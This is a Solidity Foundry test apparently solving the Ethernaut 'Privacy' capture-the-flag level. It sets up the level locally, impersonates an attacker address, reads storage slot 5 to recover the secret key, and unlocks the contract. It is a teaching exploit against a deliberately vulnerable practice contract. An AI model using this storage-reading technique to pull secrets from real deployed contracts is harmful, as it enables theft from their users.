pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/12_Privacy/PrivacyFactory.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract PrivacyTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(100);
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal attacker address some ether
        vm.deal(attacker, 5 ether);
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Cheat code to load contract storage at specific slot
        bytes32 secretData = vm.load(levelAddress, bytes32(uint256(5)));

        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(secretData)); 

        // Not relevant to completing the level but shows how we can split a bytes32 into its component parts
        bytes16[2] memory secretDataSplit = [bytes16(0), 0];
        assembly {
            mstore(secretDataSplit, secretData)
            mstore(add(secretDataSplit, 16), secretData)
        }

        ethernautPrivacy.unlock(bytes16(secretData));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
